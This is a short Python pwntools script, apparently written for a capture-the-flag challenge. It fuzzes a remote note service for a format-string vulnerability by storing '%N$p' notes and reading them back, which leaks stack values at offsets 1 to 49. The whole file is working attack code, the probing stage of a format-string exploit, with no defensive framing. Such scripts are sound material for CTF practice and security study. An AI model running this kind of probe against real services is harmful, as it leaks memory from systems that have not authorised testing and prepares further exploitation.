#!/usr/bin/env python3
from pwn import *

print("[*] Starting Format String Fuzzer...")

for i in range(1, 50):
    try:
        # Connect to the remote server
        p = remote("offsec.m0lecon.it", 13526, level='error')
        
        # 1. Select Option 1 to SET the note
        p.recvuntil(b'Exit')
        p.sendline(b'1')
        p.recvuntil(b'note: ')
        p.sendline(f'%{i}$p'.encode())
        
        # 2. Select Option 2 to PRINT the note
        p.recvuntil(b'Exit')
        p.sendline(b'2')
        
        # 3. Catch the leak!
        p.recvuntil(b"--- Your customer note ---\n")
        leak = p.recvline().strip().decode()
        
        print(f"Offset %{i}$p : {leak}")
        
        p.close()
    except Exception as e:
        print(f"Offset %{i}$p : Failed ({e})")
